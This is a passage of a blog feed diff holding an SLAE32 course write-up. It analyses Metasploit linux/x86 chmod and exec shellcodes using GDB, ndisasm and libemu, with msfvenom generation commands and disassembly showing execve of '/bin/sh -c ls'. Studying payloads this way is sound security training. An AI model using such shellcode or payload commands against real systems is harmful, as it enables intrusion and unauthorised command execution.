+777
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, at the syscall instruction (0x80), it gives the following state:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.17.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With the registers:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;EAX = 0xf // decimal value 15 for the chmod syscall&lt;/li&gt;
+  &lt;li&gt;EBX = 0x804805e (“/etc/restrictedfile”) // address of the string of the file&lt;/li&gt;
+  &lt;li&gt;ECX = 0x1ff // decimal value 777 for the mode&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h6 id=&quot;exit&quot;&gt;Exit&lt;/h6&gt;
+
+&lt;p&gt;Finally the last instructions are as follows:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.18.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can see that the value 0x1 is passed to the EAX register. 
+By looking at the corresponding sycall in the unistd_32.h file, we find out that it corresponds to the exit syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
+#define __NR_exit 1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Details of the Exit syscall:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;_exit, terminate the calling process
+#include &amp;lt;unistd.h&amp;gt;
+void _exit(int status);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finally, we can see in the last instruction that only the EAX register has been changed because the status parameter required is only used to return a state to the parent process which is not required in our case.&lt;/p&gt;
+
+&lt;h3 id=&quot;-part-3---linuxx86exec-shellcode-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Part 3 - linux/x86/exec shellcode &lt;/span&gt;&lt;/h3&gt;
+
+&lt;h4 id=&quot;-principle--2&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Principle &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;This linux/x86/exec shellcode execute an arbirary command line.&lt;/p&gt;
+
+&lt;p&gt;To find out how the shellcode works and reacts we first performed a test with the following the steps:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.21.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, an ls command as been specified to the shellcode and successfully executed when launch.&lt;/p&gt;
+
+&lt;p&gt;Now we are will go deeper and find out which syscalls are performed.&lt;/p&gt;
+
+&lt;h4 id=&quot;-shellcode-analysis-&quot;&gt;&lt;span style=&quot;color:#01416C;&quot;&gt; Shellcode Analysis &lt;/span&gt;&lt;/h4&gt;
+
+&lt;p&gt;To analyse this shellcode we can use several technics.
+First, we can use directly GDB to go step by step an stop at each syscall and looking at the register’s values.&lt;/p&gt;
+
+&lt;p&gt;We can used as well the libemu/tools/sctest script to analyse it :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
+    -S : read shellcode from stdin
+    -s : how much of the shellcode we would like to run (100000 =&amp;gt; to have all the shellcode executed)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And used the graphical option to help to visualize it :&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G exec.dot
+//Then convert into PNG file :
+dot exec.dot -Tpng -o exec.png
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Result:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.22.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, we can display the instruction with the following command line:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom -p linux/x86/exec CMD=ls R | ndisasm -u -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;In this assessment, we will use all of those technic to be more specific about the actions performed.&lt;/p&gt;
+
+&lt;p&gt;Shellcode instructions:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	push   0xb
+0x8048056:	pop    eax
+0x8048057:	cdq    
+0x8048058:	push   edx
+0x8048059:	pushw  0x632d
+0x804805d:	mov    edi,esp
+0x804805f:	push   0x68732f
+0x8048064:	push   0x6e69622f
+0x8048069:	mov    ebx,esp
+0x804806b:	push   edx
+0x804806c:	call   0x8048074
+0x8048071:	ins    BYTE PTR es:[edi],dx
+0x8048072:	jae    0x8048074
+0x8048074:	push   edi
+0x8048075:	push   ebx
+0x8048076:	mov    ecx,esp
+0x8048078:	int    0x80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The first two instructions set the value of eax to 0xb.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048054:	push   0xb
+0x8048056:	pop    eax
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;0xb in hexadecimal is equivalent to 11 in decimal.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/exec# printf &quot;%d\n&quot; 0xb
+11
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We search what syscall corresponds to the decimal value 11 in the unistd_32.h file and it appears that it is the execve syscall.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/exec# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 11
+#define __NR_execve 11
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Details of the execve syscall:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;execve - execute program
+int execve(const char *pathname, char *const argv[], char *const envp[]);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, the arguments of the exceve syscall as follows needs to be defined:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Pathname: Pointer pointing to the string of the path to the executable;&lt;/li&gt;
+  &lt;li&gt;Argv[]: Array of pointers pointing to the command-line strings;&lt;/li&gt;
+  &lt;li&gt;envp[]: Array of pointers pointing to the environment strings of the new program (usually NULL).&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The next instructions are:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x8048058:	push   edx
+0x8048059:	pushw  0x632d
+0x804805d:	mov    edi,esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It set the value 0x632d to the registers EDI.&lt;/p&gt;
+
+&lt;p&gt;We mapped the value 0x632d to the ASCII table and inversed the value because of the little indian indentation and we find out that the EDI register is set to “-c”.&lt;/p&gt;
+
+&lt;p&gt;Then, two pushs are performed on the stack and the address is then set to the register EBX.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x804805f:	push   0x68732f =&amp;gt; /sh
+0x8048064:	push   0x6e69622f =&amp;gt; /bin
+0x8048069:	mov    ebx,esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Then, we mapped the values to the ASCII table and inversed the values because of the little indian indentation and we deducted that the address of the string “/bin/sh” has been set into the EBX register.&lt;/p&gt;
+
+&lt;p&gt;Then, the following instruction are used to retrieve the command line that we want to launch.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x804806b:	push   edx
+0x804806c:	call   0x8048074
+0x8048071:	ins    BYTE PTR es:[edi],dx
+0x8048072:	jae    0x8048074
+0x8048074:	push   edi
+0x8048075:	push   ebx
+0x8048076:	mov    ecx,esp
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The call instruction performed put on the stack the address of the ls string, then the edi’s value “-c” is pushed on the stack as well as the /bin/sh and finally the ESP address containing the argument “/bin/sh -c ls” is pushed into the ECX register.&lt;/p&gt;
+
+&lt;p&gt;To conclude, as follows the state of the Execve syscall:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.24.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;SO, we can see that:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;The EAX register contains the decimal value 11 related to the Execve syscall;&lt;/li&gt;
+  &lt;li&gt;The EBX register contains the address of the string pathname /bin/sh;&lt;/li&gt;
+  &lt;li&gt;The ECX register contains the arguments “/bin/sh -c ls”;&lt;/li&gt;
+  &lt;li&gt;The EDX value is set to NULL.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;And, when the syscall is performed, the “ls” command line is executed:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/slae32-img/assignment5/assignment5.25.PNG&quot; alt=&quot;drawing&quot; style=&quot;width:900px&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><category term="SLAE32" /><summary type="html">Description of the assignment Take up at least 3 shellcode samples created using Msfpayload for linux/x86 Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode Present your analysis We are going to analyse together the following shellcodes: linux/x86/adduser linux/x86/exec linux/x86/meterpreter/reverse_tcp -TO SUPP linux/x86/chmod</summary></entry><entry><title type="html">SLAE32</title><link href="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html" rel="alternate" type="text/html" title="SLAE32" /><published>2022-10-04T08:45:58+02:00</published><updated>2022-10-04T08:45:58+02:00</updated><id>http://localhost:4000/slae32/2022/10/04/Assign4-encoder</id><content type="html" xml:base="http://localhost:4000/slae32/2022/10/04/Assign4-encoder.html">&lt;h3 id=&quot;-description-of-the-assignment-&quot;&gt;&lt;span style=&quot;color:#2d8fb3;&quot;&gt; Description of the assignment &lt;/span&gt;&lt;/h3&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Create a custom encoding scheme like the “Insertion Encoder” we showed you;&lt;/li&gt;
